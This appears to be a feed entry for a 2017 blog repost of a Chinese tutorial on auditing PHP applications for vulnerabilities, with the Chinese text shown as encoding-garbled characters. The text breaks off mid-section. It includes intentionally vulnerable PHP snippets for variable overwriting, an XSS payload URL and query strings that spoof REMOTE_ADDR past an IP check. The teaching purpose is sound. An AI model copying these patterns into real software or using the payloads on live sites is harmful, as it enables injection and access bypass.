    <title>[è½¬è½½]é«˜çº§PHPåº”ç”¨ç¨‹åºæ¼æ´å®¡æ ¸æŠ€æœ¯</title>
    <link href="http://zer0yu.github.io/2017/10/31/%E8%BD%AC%E8%BD%BD-%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF/"/>
    <id>http://zer0yu.github.io/2017/10/31/è½¬è½½-é«˜çº§PHPåº”ç”¨ç¨‹åºæ¼æ´å®¡æ ¸æŠ€æœ¯/</id>
    <published>2017-10-31T11:08:46.000Z</published>
    <updated>2017-12-02T11:50:44.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>PHPæ˜¯ä¸€ç§è¢«å¹¿æ³›ä½¿ç”¨çš„è„šæœ¬è¯­è¨€ï¼Œå°¤å…¶é€‚åˆäºwebå¼€å‘ã€‚å…·æœ‰è·¨å¹³å°ï¼Œå®¹æ˜“å­¦ä¹ ï¼ŒåŠŸèƒ½å¼ºå¤§ç­‰ç‰¹ç‚¹ï¼Œæ®ç»Ÿè®¡å…¨ä¸–ç•Œæœ‰è¶…è¿‡34%çš„ç½‘ç«™æœ‰phpçš„åº”ç”¨ï¼ŒåŒ…æ‹¬Yahooã€sinaã€163ã€sohuç­‰å¤§å‹é—¨æˆ·ç½‘ç«™ã€‚è€Œä¸”å¾ˆå¤šå…·åçš„webåº”ç”¨ç³»ç»Ÿï¼ˆåŒ…æ‹¬bbs,blog,wiki,cmsç­‰ç­‰ï¼‰éƒ½æ˜¯ä½¿ç”¨phpå¼€å‘çš„ï¼ŒDiscuzã€phpwindã€phpbbã€vbbã€wordpressã€boblogç­‰ç­‰ã€‚</p><p>éšç€webå®‰å…¨çš„çƒ­ç‚¹å‡çº§ï¼Œphpåº”ç”¨ç¨‹åºçš„ä»£ç å®‰å…¨é—®é¢˜ä¹Ÿé€æ­¥å…´ç››èµ·æ¥ï¼Œè¶Šæ¥è¶Šå¤šçš„å®‰å…¨äººå‘˜æŠ•å…¥åˆ°è¿™ä¸ªé¢†åŸŸï¼Œè¶Šæ¥è¶Šå¤šçš„åº”ç”¨ç¨‹åºä»£ç æ¼æ´è¢«æŠ«éœ²ã€‚é’ˆå¯¹è¿™æ ·ä¸€ä¸ªçŠ¶å†µï¼Œå¾ˆå¤šåº”ç”¨ç¨‹åºçš„å®˜æ–¹éƒ½æˆç«‹äº†å®‰å…¨éƒ¨é—¨ï¼Œæˆ–è€…é›‡ä½£å®‰å…¨äººå‘˜è¿›è¡Œä»£ç å®¡è®¡ï¼Œå› æ­¤å‡ºç°äº†å¾ˆå¤šè‡ªåŠ¨åŒ–å•†ä¸šåŒ–çš„ä»£ç å®¡è®¡å·¥å…·ã€‚</p><p>ä¹Ÿå°±æ˜¯è¿™æ ·çš„å½¢åŠ¿å¯¼è‡´äº†ä¸€ä¸ªå±€é¢ï¼šå¤§å…¬å¸çš„äº§å“å®‰å…¨ç³»æ•°å¤§å¤§çš„æé«˜ï¼Œé‚£äº›å¾ˆæ˜æ˜¾çš„æ¼æ´åŸºæœ¬ç­ç»äº†ï¼Œé‚£äº›å¤§å®¶éƒ½çŸ¥é“çš„å®¡è®¡æŠ€æœ¯éƒ½æ— ç”¨æ­¦ä¹‹åœ°äº†ã€‚æˆ‘ä»¬é¢å¯¹å¾ˆå¤šå·¥å…·ä»¥åŠå¤§ç‰›æ‰«æè¿‡néçš„ä»£ç ï¼Œæœ‰å¾ˆå¤šçš„å®‰å…¨äººå‘˜æœ‰ç‚¹æ‚²è§‚ï¼Œè€Œæœ‰çš„å®˜æ–¹å®‰å…¨äººå‘˜ä¹Ÿéå¸¸çš„æ”¾å¿ƒè‡ªå·±çš„ä»£ç ï¼Œä½†æ˜¯ä¸è¦å¿˜è®°äº†â€œæ²¡æœ‰ç»å¯¹çš„å®‰å…¨â€ï¼Œæˆ‘ä»¬åº”è¯¥å»å¯»æ‰¾æ–°çš„é€”å¾„æŒ–æ˜æ–°çš„æ¼æ´ã€‚æœ¬æ–‡å°±ç»™ä»‹ç»äº†ä¸€äº›éä¼ ç»Ÿçš„æŠ€æœ¯ç»éªŒå’Œå¤§å®¶åˆ†äº«ã€‚</p><p>å¦å¤–åœ¨è¿™é‡Œç‰¹åˆ«è¯´æ˜ä¸€ä¸‹æœ¬æ–‡é‡Œé¢å¾ˆå¤šæ¼æ´éƒ½æ˜¯æ¥æºäºç½‘ç»œä¸Šç‰›äººå’Œæœ‹å‹ä»¬çš„åˆ†äº«ï¼Œåœ¨è¿™é‡Œéœ€è¦æ„Ÿè°¢ä»–ä»¬ ï¼šï¼‰</p><h3 id="ä¼ ç»Ÿçš„ä»£ç å®¡è®¡æŠ€æœ¯"><a href="#ä¼ ç»Ÿçš„ä»£ç å®¡è®¡æŠ€æœ¯" class="headerlink" title="ä¼ ç»Ÿçš„ä»£ç å®¡è®¡æŠ€æœ¯"></a>ä¼ ç»Ÿçš„ä»£ç å®¡è®¡æŠ€æœ¯</h3><p>WEBåº”ç”¨ç¨‹åºæ¼æ´æŸ¥æ‰¾åŸºæœ¬ä¸Šæ˜¯å›´ç»•ä¸¤ä¸ªå…ƒç´ å±•å¼€ï¼šå˜é‡ä¸å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€æ¼æ´çš„åˆ©ç”¨å¿…é¡»æŠŠä½ æäº¤çš„æ¶æ„ä»£ç é€šè¿‡å˜é‡ç»è¿‡næ¬¡å˜é‡è½¬æ¢ä¼ é€’ï¼Œæœ€ç»ˆä¼ é€’ç»™ç›®æ ‡å‡½æ•°æ‰§è¡Œï¼Œè¿˜è®°å¾—MSé‚£å¥ç»å…¸çš„åè¨€å—ï¼Ÿâ€œä¸€åˆ‡è¾“å…¥éƒ½æ˜¯æœ‰å®³çš„â€ã€‚è¿™å¥è¯åªå¼ºè°ƒäº†å˜é‡è¾“å…¥ï¼Œå¾ˆå¤šç¨‹åºå‘˜æŠŠâ€œè¾“å…¥â€ç†è§£ä¸ºåªæ˜¯gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>ï¼Œä½†æ˜¯å˜é‡åœ¨ä¼ é€’è¿‡ç¨‹äº§ç”Ÿäº†nå¤šçš„å˜åŒ–ã€‚å¯¼è‡´å¾ˆå¤šè¿‡æ»¤åªæ˜¯ä¸ªâ€œçº¸è€è™â€ï¼æˆ‘ä»¬æ¢å¥è¯æ¥æå™ä¸‹ä»£ç å®‰å…¨ï¼šâ€œä¸€åˆ‡è¿›å…¥å‡½æ•°çš„å˜é‡æ˜¯æœ‰å®³çš„â€ã€‚</p><p>PHPä»£ç å®¡è®¡æŠ€æœ¯ç”¨çš„æœ€å¤šä¹Ÿæ˜¯ç›®å‰çš„ä¸»åŠ›æ–¹æ³•ï¼šé™æ€åˆ†æï¼Œä¸»è¦ä¹Ÿæ˜¯é€šè¿‡æŸ¥æ‰¾å®¹æ˜“å¯¼è‡´å®‰å…¨æ¼æ´çš„å±é™©å‡½æ•°ï¼Œå¸¸ç”¨çš„å¦‚grepï¼Œfindstrç­‰æœç´¢å·¥å…·ï¼Œå¾ˆå¤šè‡ªåŠ¨åŒ–å·¥å…·ä¹Ÿæ˜¯ä½¿ç”¨æ­£åˆ™æ¥æœç´¢è¿™äº›å‡½æ•°ã€‚ä¸‹é¢åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸‹æ–‡è¯´çš„å­—å…¸ï¼ˆæš‚ç•¥ï¼‰ã€‚ä½†æ˜¯ç›®å‰åŸºæœ¬å·²æœ‰çš„å­—å…¸å¾ˆéš¾æ‰¾åˆ°æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰©å±•æˆ‘ä»¬çš„å­—å…¸ï¼Œè¿™äº›å­—å…¸ä¹Ÿæ˜¯æœ¬æ–‡ä¸»è¦æ¢è®¨çš„ã€‚</p><p>å…¶ä»–çš„æ–¹æ³•æœ‰ï¼šé€šè¿‡ä¿®æ”¹PHPæºä»£ç æ¥åˆ†æå˜é‡æµç¨‹ï¼Œæˆ–è€…hookå±é™©çš„å‡½æ•°æ¥å®ç°å¯¹åº”ç”¨ç¨‹åºä»£ç çš„å®¡æ ¸ï¼Œä½†æ˜¯è¿™äº›ä¹Ÿä¾é äº†æˆ‘ä»¬ä¸Šé¢æåˆ°çš„å­—å…¸ã€‚</p><h3 id="PHPç‰ˆæœ¬ä¸åº”ç”¨ä»£ç å®¡è®¡"><a href="#PHPç‰ˆæœ¬ä¸åº”ç”¨ä»£ç å®¡è®¡" class="headerlink" title="PHPç‰ˆæœ¬ä¸åº”ç”¨ä»£ç å®¡è®¡"></a>PHPç‰ˆæœ¬ä¸åº”ç”¨ä»£ç å®¡è®¡</h3><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼ŒPHPä¸»è¦æœ‰3ä¸ªç‰ˆæœ¬ï¼šphp4ã€php5ã€php6ï¼Œä½¿ç”¨æ¯”ä¾‹å¤§è‡´å¦‚ä¸‹ï¼š</p><table><thead><tr><th style="text-align:left">ç‰ˆæœ¬</th><th style="text-align:left">å æ¯”</th><th style="text-align:left">è¯´æ˜</th></tr></thead><tbody><tr><td style="text-align:left">php4</td><td style="text-align:left">68%</td><td style="text-align:left">2000-2007ï¼ŒNo security fixes after 2008/08ï¼Œæœ€ç»ˆç‰ˆæœ¬æ˜¯php4.4.9</td></tr><tr><td style="text-align:left">php5</td><td style="text-align:left">32%</td><td style="text-align:left">2004-presentï¼ŒNow at version 5.2.6ï¼ˆPHP 5.3 alpha1 released!ï¼‰</td></tr><tr><td style="text-align:left">php6</td><td style="text-align:left"></td><td style="text-align:left">ç›®å‰è¿˜åœ¨æµ‹è¯•é˜¶æ®µï¼Œå˜åŒ–å¾ˆå¤šåšäº†å¤§é‡çš„ä¿®æ”¹ï¼Œå–æ¶ˆäº†å¾ˆå¤šå®‰å…¨é€‰é¡¹å¦‚magic_quotes_gpc</td></tr></tbody></table><p>ç”±äºphpç¼ºå°‘è‡ªåŠ¨å‡çº§çš„æœºåˆ¶ï¼Œå¯¼è‡´ç›®å‰PHPç‰ˆæœ¬å¹¶å­˜ï¼Œä¹Ÿå¯¼è‡´å¾ˆå¤šå­˜åœ¨æ¼æ´æ²¡æœ‰è¢«ä¿®è¡¥ã€‚è¿™äº›æœ‰æ¼æ´çš„å‡½æ•°ä¹Ÿæ˜¯æˆ‘ä»¬è¿›è¡ŒWEBåº”ç”¨ç¨‹åºä»£ç å®¡è®¡çš„é‡ç‚¹å¯¹è±¡ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å­—å…¸é‡è¦æ¥æºã€‚</p><h3 id="å…¶ä»–çš„å› ç´ ä¸åº”ç”¨ä»£ç å®¡è®¡"><a href="#å…¶ä»–çš„å› ç´ ä¸åº”ç”¨ä»£ç å®¡è®¡" class="headerlink" title="å…¶ä»–çš„å› ç´ ä¸åº”ç”¨ä»£ç å®¡è®¡"></a>å…¶ä»–çš„å› ç´ ä¸åº”ç”¨ä»£ç å®¡è®¡</h3><p>å¾ˆå¤šä»£ç å®¡è®¡è€…æ‹¿åˆ°ä»£ç å°±çœ‹ï¼Œä»–ä»¬å¿½è§†äº†â€œå®‰å…¨æ˜¯ä¸€ä¸ªæ•´ä½“â€ï¼Œä»£ç å®‰å…¨å¾ˆå¤šçš„å…¶ä»–å› ç´ æœ‰å…³ç³»ï¼Œæ¯”å¦‚ä¸Šé¢æˆ‘ä»¬è°ˆåˆ°çš„PHPç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ¯”è¾ƒé‡è¦çš„è¿˜æœ‰æ“ä½œç³»ç»Ÿç±»å‹ï¼ˆä¸»è¦æ˜¯ä¸¤å¤§é˜µè¥win/<code>*</code>nixï¼‰ï¼ŒWEBæœåŠ¡ç«¯è½¯ä»¶ï¼ˆä¸»è¦æ˜¯iis/apacheä¸¤å¤§ç±»å‹ï¼‰ç­‰å› ç´ ã€‚è¿™æ˜¯ç”±äºä¸åŒçš„ç³»ç»Ÿä¸åŒçš„WEB SERVERæœ‰ç€ä¸åŒçš„å®‰å…¨ç‰¹ç‚¹æˆ–ç‰¹æ€§ï¼Œä¸‹æ–‡æœ‰äº›éƒ¨åˆ†ä¼šæ¶‰åŠã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨åšæŸä¸ªå…¬å¸WEBåº”ç”¨ä»£ç å®¡è®¡æ—¶ï¼Œåº”è¯¥äº†è§£ä»–ä»¬ä½¿ç”¨çš„ç³»ç»Ÿï¼ŒWEBæœåŠ¡ç«¯è½¯ä»¶ï¼ŒPHPç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚</p><h3 id="æ‰©å±•æˆ‘ä»¬çš„å­—å…¸"><a href="#æ‰©å±•æˆ‘ä»¬çš„å­—å…¸" class="headerlink" title="æ‰©å±•æˆ‘ä»¬çš„å­—å…¸"></a>æ‰©å±•æˆ‘ä»¬çš„å­—å…¸</h3><p>ä¸‹é¢å°†è¯¦ç»†ä»‹ç»ä¸€äº›éä¼ ç»ŸPHPåº”ç”¨ä»£ç å®¡è®¡ä¸€äº›æ¼æ´ç±»å‹å’Œåˆ©ç”¨æŠ€å·§ã€‚</p><h3 id="å˜é‡æœ¬èº«çš„key"><a href="#å˜é‡æœ¬èº«çš„key" class="headerlink" title="å˜é‡æœ¬èº«çš„key"></a>å˜é‡æœ¬èº«çš„key</h3><hr><p>è¯´åˆ°å˜é‡çš„æäº¤å¾ˆå¤šäººåªæ˜¯çœ‹åˆ°äº†GET/POST/COOKIEç­‰æäº¤çš„å˜é‡çš„å€¼ï¼Œä½†æ˜¯å¿˜è®°äº†æœ‰çš„ç¨‹åºæŠŠå˜é‡æœ¬èº«çš„keyä¹Ÿå½“å˜é‡æå–ç»™å‡½æ•°å¤„ç†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç å°±æå–äº†å˜é‡æœ¬èº«çš„keyæ˜¾ç¤ºå‡ºæ¥ï¼Œå•çº¯å¯¹äºä¸Šé¢çš„ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬æäº¤URLï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯¼è‡´ä¸€ä¸ªxssçš„æ¼æ´ï¼Œæ‰©å±•ä¸€ä¸‹å¦‚æœè¿™ä¸ªkeyæäº¤ç»™include()ç­‰å‡½æ•°æˆ–è€…sqlæŸ¥è¯¢å‘¢ï¼Ÿï¼šï¼‰ </p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ : æ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ : æ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ : é€šè¯»ä»£ç </td></tr></tbody></table><h3 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h3><hr><p>å¾ˆå¤šçš„æ¼æ´æŸ¥æ‰¾è€…éƒ½çŸ¥é“extract()è¿™ä¸ªå‡½æ•°åœ¨æŒ‡å®šå‚æ•°ä¸ºEXTR_OVERWRITEæˆ–è€…æ²¡æœ‰æŒ‡å®šå‡½æ•°å¯ä»¥å¯¼è‡´å˜é‡è¦†ç›–ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šå…¶ä»–æƒ…å†µå¯¼è‡´å˜é‡è¦†ç›–çš„å¦‚ï¼š</p><h3 id="éå†åˆå§‹åŒ–å˜é‡"><a href="#éå†åˆå§‹åŒ–å˜é‡" class="headerlink" title="éå†åˆå§‹åŒ–å˜é‡"></a>éå†åˆå§‹åŒ–å˜é‡</h3><p>è¯·çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//var.php?a=fuck</span></span><br><span class="line">$a=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆå¤šçš„WEBåº”ç”¨éƒ½ä½¿ç”¨ä¸Šé¢çš„æ–¹å¼ï¼ˆæ³¨æ„å¾ªç¯ä¸ä¸€å®šæ˜¯foreachï¼‰ï¼Œå¦‚Discuz!4.1çš„WAPéƒ¨åˆ†çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$chs = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>) &#123;</span><br><span class="line">$chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$$key = $chs-&gt;Convert($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($chs);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><h3 id="parse-str-å˜é‡è¦†ç›–æ¼æ´"><a href="#parse-str-å˜é‡è¦†ç›–æ¼æ´" class="headerlink" title="parse_str()å˜é‡è¦†ç›–æ¼æ´"></a>parse_str()å˜é‡è¦†ç›–æ¼æ´</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=new</span></span><br><span class="line">$var = <span class="string">'init'</span>;                     </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]); </span><br><span class="line"><span class="keyword">print</span> $var;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸€æ ·å¯ä»¥è¦†ç›–æ•°ç»„å˜é‡ï¼Œä¸Šé¢çš„ä»£ç æ˜¯é€šè¿‡$<code>_</code>SERVER[â€˜QUERY_STRINGâ€™]æ¥æå–å˜é‡çš„ï¼Œå¯¹äºæŒ‡å®šäº†å˜é‡åçš„æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å°„â€œ=â€æ¥å®ç°è¦†ç›–å…¶ä»–çš„å˜é‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=1&amp;a[1]=var1%3d222</span></span><br><span class="line">$var1 = <span class="string">'init'</span>;</span><br><span class="line">parse_str($a[$_GET[<span class="string">'var'</span>]]);</span><br><span class="line"><span class="keyword">print</span> $var1;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç é€šè¿‡æäº¤$varæ¥å®ç°å¯¹$var1çš„è¦†ç›–ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥ï¼ˆparse_strï¼‰</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦parse_str</td></tr></tbody></table><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥ï¼ˆmb_parse_strï¼‰</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šphp4&lt;4.4.7 php5&lt;5.2.2</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦mb_parse_str</td></tr></tbody></table><h3 id="import-request-variables-å˜é‡è¦†ç›–æ¼æ´"><a href="#import-request-variables-å˜é‡è¦†ç›–æ¼æ´" class="headerlink" title="import_request_variables()å˜é‡è¦†ç›–æ¼æ´"></a>import_request_variables()å˜é‡è¦†ç›–æ¼æ´</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'GLOBALS '</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"n"</span>;</span><br><span class="line">import_request_variables(<span class="string">'GPC'</span>);</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'10.1.1.1'</span>) <span class="keyword">die</span>(<span class="string">'Go away!'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello admin!'</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥ï¼ˆimport_request_variablesï¼‰</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šphp4&lt;4.4.1 php5&lt;5.2.2</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦import_request_variables</td></tr></tbody></table><h3 id="PHP5-Globals"><a href="#PHP5-Globals" class="headerlink" title="PHP5 Globals"></a>PHP5 Globals</h3><p>ä»ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´è¿™ä¸ªä¸å¯ä»¥ç®—æ˜¯PHPçš„æ¼æ´ï¼Œåªèƒ½ç®—æ˜¯ä¸€ä¸ªç‰¹æ€§ï¼Œæµ‹è¯•ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//register_globals = &apos;ON&apos;</span><br><span class="line">//foo.php?GLOBALS[foobar]=HELLO</span><br><span class="line">echo $foobar; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¾ˆå¤šçš„ç¨‹åºæ²¡æœ‰è€ƒè™‘åˆ°è¿™ç‚¹ï¼Œè¯·çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸ºäº†å®‰å…¨å–æ¶ˆå…¨å±€å˜é‡</span></span><br><span class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">'register_globals'</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="keyword">print</span> $_GET[b];</span><br></pre></td></tr></table></figure><p>å¦‚æœç†Ÿæ‚‰WEB2.0çš„æ”»å‡»çš„åŒå­¦ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œcrsfæ”»å‡»ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><h3 id="magic-quotes-gpcä¸ä»£ç å®‰å…¨"><a href="#magic-quotes-gpcä¸ä»£ç å®‰å…¨" class="headerlink" title="magic_quotes_gpcä¸ä»£ç å®‰å…¨"></a>magic_quotes_gpcä¸ä»£ç å®‰å…¨</h3><hr><h3 id="ä»€ä¹ˆæ˜¯magic-quotes-gpc"><a href="#ä»€ä¹ˆæ˜¯magic-quotes-gpc" class="headerlink" title="ä»€ä¹ˆæ˜¯magic_quotes_gpc"></a>ä»€ä¹ˆæ˜¯magic_quotes_gpc</h3><p>å½“æ‰“å¼€æ—¶ï¼Œæ‰€æœ‰çš„ â€˜ï¼ˆå•å¼•å·ï¼‰ï¼Œâ€ï¼ˆåŒå¼•å·ï¼‰ï¼Œ\ï¼ˆåæ–œçº¿ï¼‰å’Œ NULL å­—ç¬¦éƒ½ä¼šè¢«è‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªåæ–œçº¿è¿›è¡Œè½¬ä¹‰ã€‚è¿˜æœ‰å¾ˆå¤šå‡½æ•°æœ‰ç±»ä¼¼çš„ä½œç”¨ å¦‚ï¼šaddslashes()ã€mysql_escape_string()ã€mysql_real_escape_string()ç­‰ï¼Œå¦å¤–è¿˜æœ‰parse_str()åçš„å˜é‡ä¹Ÿå—magic_quotes_gpcçš„å½±å“ã€‚ç›®å‰å¤§å¤šæ•°çš„ä¸»æœºéƒ½æ‰“å¼€äº†è¿™ä¸ªé€‰é¡¹ï¼Œå¹¶ä¸”å¾ˆå¤šç¨‹åºå‘˜ä¹Ÿæ³¨æ„ä½¿ç”¨ä¸Šé¢é‚£äº›å‡½æ•°å»è¿‡æ»¤å˜é‡ï¼Œè¿™çœ‹ä¸Šå»å¾ˆå®‰å…¨ã€‚å¾ˆå¤šæ¼æ´æŸ¥æ‰¾è€…æˆ–è€…å·¥å…·é‡åˆ°äº›å‡½æ•°è¿‡æ»¤åçš„å˜é‡ç›´æ¥å°±æ”¾å¼ƒï¼Œä½†æ˜¯å°±åœ¨ä»–ä»¬æ”¾å¼ƒçš„åŒæ—¶ä¹Ÿæ”¾è¿‡å¾ˆå¤šè‡´å‘½çš„å®‰å…¨æ¼æ´ã€‚ ï¼šï¼‰</p><h3 id="å“ªäº›åœ°æ–¹æ²¡æœ‰é­”æœ¯å¼•å·çš„ä¿æŠ¤"><a href="#å“ªäº›åœ°æ–¹æ²¡æœ‰é­”æœ¯å¼•å·çš„ä¿æŠ¤" class="headerlink" title="å“ªäº›åœ°æ–¹æ²¡æœ‰é­”æœ¯å¼•å·çš„ä¿æŠ¤"></a>å“ªäº›åœ°æ–¹æ²¡æœ‰é­”æœ¯å¼•å·çš„ä¿æŠ¤</h3><p><em>1) $<code>_</code>SERVERå˜é‡</em></p><p>PHP5çš„$<code>_</code>SERVERå˜é‡ç¼ºå°‘magic_quotes_gpcçš„ä¿æŠ¤ï¼Œå¯¼è‡´è¿‘å¹´æ¥X-Forwarded-Forçš„æ¼æ´çŒ›æš´ï¼Œæ‰€ä»¥å¾ˆå¤šç¨‹åºå‘˜è€ƒè™‘è¿‡æ»¤X-Forwarded-Forï¼Œä½†æ˜¯å…¶ä»–çš„å˜é‡å‘¢ï¼Ÿ</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥ï¼ˆ$<code>_</code>SERVERå˜é‡ï¼‰</em></th></tr></thead><tbody><tr><td 